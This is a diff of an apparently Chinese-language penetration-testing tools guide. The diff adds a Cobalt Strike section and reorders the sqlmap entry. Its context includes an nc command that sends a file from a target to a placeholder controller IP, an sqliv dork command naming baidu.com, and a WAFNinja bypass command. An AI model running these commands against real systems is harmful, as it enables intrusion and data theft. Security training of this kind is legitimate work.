@@ -350,7 +350,7 @@
 <li>漏洞扫描：Nilto openvas Arachni w3af dirsearch XSStrike CMSeek sqliv</li>
 <li>漏洞利用 :metasploit sqlmap</li>
 <li>模糊测试：WAFNinja Wfuzz</li>
-<li>后渗透工具：nc frp</li>
+<li>后渗透工具：nc frp cobaltstrike</li>
 </ul>
 <h2 id="0x02-工具的介绍与简单使用"><a href="#0x02-工具的介绍与简单使用" class="headerlink" title="0x02 工具的介绍与简单使用"></a>0x02 工具的介绍与简单使用</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><ul>
 <li><code>whois 域名</code></li>
@@ -412,12 +412,13 @@
 <blockquote>
 <p><code>snitch -D ext -U baidu.com -P15</code></p>
 </blockquote>
-<p><img src="snith.png" alt></p>
+<p><img src="snitch.png" alt></p>
 <h3 id="sqliv"><a href="#sqliv" class="headerlink" title="sqliv"></a>sqliv</h3><p>配合谷歌黑客语法对子域名多的目标进行初步SQL检测是个不错的选择</p>
 <blockquote>
 <p><code>sqliv -d &quot;site:baidu.com inurl:?id=&quot; -e google</code></p>
 </blockquote>
 <p><img src="sqliv.png" alt></p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/</a></p>
 <h3 id="WAFNinja"><a href="#WAFNinja" class="headerlink" title="WAFNinja"></a>WAFNinja</h3><p>灵活的WAF自动化Fuzz工具</p>
 <blockquote>
 <p><code>wafinja bypass -u &quot;http://www.target.com/index.php&quot;  -p &quot;Name=PAYLOAD&amp;Submit=Submit&quot; 
@@ -455,7 +456,14 @@
 <p>控制机：<code>nc -l 6666 &gt;1.txt</code><br>靶机：<code>nc 控制端IP 6666 &lt; c:\1.txt</code></p>
 </blockquote>
 <h3 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h3><p>micropoor：<a href="https://micro8.gitbook.io/micro8/contents" target="_blank" rel="noopener">https://micro8.gitbook.io/micro8/contents</a></p>
-<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap中文手册：<a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" target="_blank" rel="noopener">https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/</a></p>
+<h3 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h3><p>后渗透神器，很方便很舒服，谁用谁知道。</p>
+<blockquote>
+<p><code>cs 服务器IP password</code></p>
+</blockquote>
+<p><img src="c1.png" alt></p>
+<blockquote>
+<p>操作机：<code>java -jar cobaltstrike.jar</code><br><img src="cs2.png" alt></p>
+</blockquote>
 
           
         
